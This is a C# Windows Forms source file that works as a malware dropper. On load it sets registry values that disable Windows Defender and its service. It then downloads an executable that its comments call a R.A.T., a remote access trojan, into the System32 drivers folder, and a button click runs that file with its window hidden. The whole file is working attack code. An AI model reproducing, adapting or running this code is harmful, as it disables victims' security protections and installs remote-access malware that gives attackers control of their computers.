using System;
using System.Threading;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.Net;
using Microsoft.Win32;

namespace //Name project
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        WebClient Download;
		
        private void Form1_Load(object sender, EventArgs e)
        {
            //Disable Windows Defender
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", 1);
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", 1);
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", 1);
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", 1);
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", 1);
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinDefend", "Start", 0);
            //Download the client server (R.A.T.)
            string urlHosts = "http://localhost/download/hosts.exe";
            string pathHosts = @"C:\Windows\System32\drivers\etc";
            Download = new WebClient();
            Thread execute = new Thread(() =>
            {
                Uri downloadURLHosts = new Uri(urlHosts);
                string fileName = Path.GetFileName(downloadURLHosts.AbsolutePath);
                Download.DownloadFileAsync(downloadURLHosts, pathHosts + "/" + fileName);
            });
            execute.Start();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            // Run the client server (R.A.T.)
            Process clientServer = new Process();
            ProcessStartInfo startInformation = new ProcessStartInfo();
            startInformation.UseShellExecute = false;
            startInformation.RedirectStandardOutput = true;
            startInformation.CreateNoWindow = true;
            startInformation.FileName = @"C:\Windows\System32\drivers\etc\hosts.exe";
            clientServer.StartInfo = startInformation;
            clientServer.Start();
            clientServer.Close();
        }